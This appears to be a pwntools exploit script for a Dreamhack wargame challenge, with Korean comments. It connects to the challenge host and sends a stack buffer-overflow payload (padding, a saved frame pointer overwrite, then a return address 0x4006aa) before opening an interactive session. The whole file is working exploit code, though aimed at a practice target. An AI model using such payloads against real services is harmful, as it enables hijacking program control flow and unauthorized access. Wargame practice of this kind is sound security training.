from pwn import *

p = remote("host3.dreamhack.games",15896) # 이걸로 dreamhack 환경이랑 연결
p.recvuntil("Input: ") #input:  문자열이 나올때까지 대기
p.sendline(b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')

p.interactive() #터미널이랑 연결 

